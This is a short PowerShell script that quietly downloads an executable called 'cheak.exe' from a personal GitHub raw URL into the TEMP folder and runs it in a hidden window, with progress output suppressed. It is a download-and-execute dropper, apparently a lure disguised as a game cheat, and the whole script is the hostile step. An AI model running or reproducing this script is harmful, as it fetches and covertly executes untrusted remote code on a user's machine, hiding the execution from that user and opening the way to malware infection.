$ProgressPreference = 'SilentlyContinue'
$url = "https://raw.githubusercontent.com/tibizda068-collab/rust/main/cheak.exe"
$path = "$env:TEMP\cheak.exe"

irm $url -OutFile $path -UseBasicParsing
Start-Process $path -WindowStyle Hidden